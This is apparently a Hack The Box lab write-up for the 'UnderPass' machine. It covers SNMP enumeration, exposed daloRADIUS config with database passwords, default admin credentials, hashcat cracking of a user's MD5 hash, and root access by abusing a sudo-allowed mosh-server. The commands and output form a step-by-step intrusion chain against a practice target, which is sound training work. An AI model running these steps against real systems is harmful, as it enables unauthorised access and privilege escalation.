# UnderPass - HTB Write-up

## Initial portscan (tcp)
```shell
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial portscan (udp)
```shell
161/udp open  snmp
```

## Port 80 - Default apache
Running gobuster with dir-medium.txt does not find anything.

## Port 161 (udp) - SNMP
Lets run basic scripts with nmap
```shell
❯ sudo nmap -sU -p161 --script=snmp-brute $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 17:15 EDT
Nmap scan report for 10.129.105.232 (10.129.105.232)
Host is up (0.037s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  public - Valid credentials
```

We have valid `public` credentials a.k.a community string. Let's try to dump the info.
```shell
❯ snmpwalk -v 1 -c public $ip
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (64700) 0:10:47.00
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (65950) 0:10:59.50
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 03 0D 15 10 12 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 219
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

This reveals an account and a domain.

```shell
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
```

It also reveals a possible software called `daloradius`.

## Daloradius
Daloradius is a popular software for managing hotspots.

```shell
❯ dirsearch -u $url -t 50
[17:28:11] Starting: daloradius/
[17:28:16] 200 -  221B  - /daloradius/.gitignore
[17:28:26] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[17:28:28] 200 -   24KB - /daloradius/ChangeLog
[17:28:30] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[17:28:30] 200 -    2KB - /daloradius/docker-compose.yml
[17:28:30] 200 -    2KB - /daloradius/Dockerfile
[17:28:35] 200 -   18KB - /daloradius/LICENSE
[17:28:35] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[17:28:40] 200 -   10KB - /daloradius/README.md
[17:28:42] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/
```

`.gitignore`
```shell
.idea/
*.log
*.db
invoice_preview.html
.DS_Store
data/
internal_data/

var/log/*.log
var/backup/*.sql
app/common/includes/daloradius.conf.php
app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/*
```

`docker-compose.yml`
```shell
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data
```

**MySQL Credentials**
```shell
- MYSQL_DATABASE=radius
- MYSQL_USER=radius
- MYSQL_PASSWORD=radiusdbpw
- MYSQL_ROOT_PASSWORD=radiusrootdbpw
```

**Default Credentials**

In the github project we can find default credentials for this webapp:

`administrator` / `radius`

## Dirsearch /app/
```shell
❯ dirsearch -u "http://underpass.htb/daloradius/app/" -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Target: http://underpass.htb/

[17:39:18] Starting: daloradius/app/
[17:39:19] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[17:39:19] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[17:39:36] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/
```

The default credentials work in `/daloradius/app/operators`. 

## Cracking MD5

In the webpage we can see a user called `svcMosh` with a MD5 password `412DD4759978ACFCC81DEAB01B382403`.

Let's try to crack it.

```shell
❯ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show
412dd4759978acfcc81deab01b382403:underwaterfriends
```

**New SSH credentials!**
- Username: `svcMosh`
- Password: `underwaterfriends`


## Privilege escalation
Check `sudo -l` and find `mosh-server` available. You can check online that it is a SSH replacement.

https://mosh.org/#usage

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

### Creating a mosh server
```shell
svcMosh@underpass:~$ sudo /usr/bin/mosh-server -p 4444
Error binding to IP -p: Bad IP address (-p): Name or service not known: Success


MOSH CONNECT 4444 c/Qn2uJcxpKMPThKILK5Yg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2802]
```

Now run `MOSH_KEY="c/Qn2uJcxpKMPThKILK5Yg" mosh-client 127.0.0.1 4444` to get into the root shell =)

